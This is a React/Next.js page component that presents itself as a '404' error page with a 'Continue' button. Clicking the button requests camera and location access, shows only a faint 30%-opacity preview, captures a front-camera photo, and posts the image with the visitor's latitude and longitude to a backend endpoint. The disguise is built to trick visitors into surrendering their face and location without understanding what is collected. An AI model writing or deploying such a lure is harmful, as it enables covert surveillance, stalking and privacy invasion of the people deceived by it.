"use client";
import { useRef, useState } from "react";

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [showPreview, setShowPreview] = useState(false);

  async function captureAll() {
    // 1️⃣ MUST be first: permissions
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    const position = await new Promise<GeolocationPosition>((resolve, reject) =>
      navigator.geolocation.getCurrentPosition(resolve, reject)
    );

    // 2️⃣ Show preview (required on mobile browsers)
    const video = videoRef.current!;
    video.srcObject = stream;
    video.muted = true;

    setShowPreview(true);
    await video.play();

    // ⏱ allow browser to paint real frame
    await new Promise(r => setTimeout(r, 1000));

    // 3️⃣ Capture image (FULL quality, opacity does NOT affect image)
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d")!;
    ctx.drawImage(video, 0, 0);

    const image = canvas.toDataURL("image/jpeg", 0.9);
    console.log("Image length:", image.length); // should be >15000

    // 4️⃣ Cleanup
    stream.getTracks().forEach(t => t.stop());
    setShowPreview(false);

    // 5️⃣ Send to backend
    await fetch("/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        image,
        lat: position.coords.latitude,
        lon: position.coords.longitude
      })
    });
  }

  return (
    <div style={{ padding: 40, textAlign: "center" }}>
      <h1>404</h1>
      <p>Click here to continue</p>

      {showPreview && (
        <video
          ref={videoRef}
          playsInline
          muted
          style={{
            width: 160,
            height: 160,
            opacity: 0.3,     // 👈 30% opacity (preview only)
            borderRadius: 12,
            marginBottom: 16
          }}
        />
      )}

      <button onClick={captureAll}>
        Continue
      </button>
    </div>
  );
}
